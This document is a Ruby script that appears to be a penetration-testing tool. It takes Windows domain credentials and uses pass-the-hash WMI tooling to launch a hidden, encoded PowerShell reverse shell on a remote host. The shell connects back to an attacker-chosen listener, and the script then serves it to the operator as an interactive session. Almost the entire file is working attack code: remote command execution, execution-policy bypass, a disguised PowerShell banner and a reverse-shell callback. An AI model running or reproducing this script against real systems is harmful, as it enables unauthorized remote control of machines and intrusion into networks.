#!/usr/bin/env ruby
#Author: Andrew 'ch33kyf3ll0w' Bonstrom
#Currently relies on pth's patched wmi binaries (specifically wmis) for execution
#v1.0
require 'open3'
require 'base64'
require 'socket'
trap("SIGINT") {exit;}
#################################################################################
##Functions
#################################################################################
#Usage, duh
def usage
        puts "Usage: ruby psi-session.rb <DOMAIN/username> <password> <rhost> <lhost> <lport>\n\n"
end
#Feed appropriate data to wmis binary to execute powershell reverseshell one liner
def wmisCommand(username, password, rhost, pshellCommand)

	wmiStr = <<-EOS
pth-wmis -U USER%PASS //RHOST "powershell.exe -NoP -W Hidden -Exec Bypass -Enc PAYLOAD"
EOS

wmiStrMod = wmiStr.to_s.sub("USER", username).sub("PASS", password).sub("RHOST", rhost).sub("PAYLOAD", pshellCommand)
	return wmiStrMod
end
#Modify the powershell reverse shell one liner for the appropriate listening host & port
def psCreate(lhost, lport)
	psStr = <<-EOS
function reverse_shell{Param([String]$Command,[String]$Download);Process{$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding;$data = $EncodedText.GetString($bytes,0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> ';$x = ($error[0] | Out-String);$error.clear();$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close();};};Start-Sleep -s 1;reverse_shell
EOS
	psStrBase64 = Base64.strict_encode64(psStr.to_s.sub("LHOST", lhost).sub("LPORT", lport).encode("utf-16le"))
	return psStrBase64
end
#################################################################################
##Main
#################################################################################
if ARGV.empty?
        usage
else
	#Setting up vars
	rUsername = ARGV[0]
	rPassword = ARGV[1]
	rHost = ARGV[2]
	lHost = ARGV[3]
	lPort = ARGV[4]
	#Function calls
	#Create the command and assign to var psCommand
	psCommand = psCreate(lHost, lPort)
	fullCommand = wmisCommand(rUsername, rPassword, rHost, psCommand)
	Open3.popen3(fullCommand) {|stdin, stdout, stderr|}
	#Fire up the old listener
	server = TCPServer.new(lPort)
	server.listen(1)
	@socket = server.accept
	#Handles tcp socket functionality
    while(true)
      	if(IO.select([],[],[@socket, STDIN],0))
        	socket.close
        	return
        end
      begin
        while( (data = @socket.recv_nonblock(1024)) != "")
          STDOUT.write(data);
        end
        break
      rescue Errno::ECONNRESET
      rescue Errno::EAGAIN
      end
      begin
        while( (data = STDIN.read_nonblock(1024)) != "")
          @socket.write(data);
        end
        break
      rescue Errno::EAGAIN
      rescue EOFError
        break
      end
      IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])
    end
end
